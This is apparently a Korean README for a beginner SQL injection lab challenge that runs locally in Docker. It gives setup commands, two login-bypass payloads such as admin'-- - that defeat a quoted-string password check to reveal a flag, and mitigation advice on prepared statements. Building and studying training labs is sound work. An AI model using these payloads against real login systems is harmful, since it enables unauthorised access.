# SQLi #1 — 기본

| | |
|---|---|
| 버그클래스 | SQL Injection |
| 난이도 | ★☆☆ |
| 포트 | 9201 |

## 학습 목표
userid/userpw 가 작은따옴표 문자열에 그대로 들어간다. 주석/논리연산으로 인증 우회.

## 실행
```bash
./gen_flags.sh
make up-injection   # 또는: docker compose up -d --build sqli-1 db
# http://localhost:9201
```

## 진행
1. `userid=admin'-- -&userpw=x` 로 비밀번호 조건 무력화.
2. 또는 `userid=' or userid='admin'-- -`.
3. admin 으로 인식되면 flag 출력.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 대응방안
Prepared Statement(파라미터 바인딩), 입력 검증.
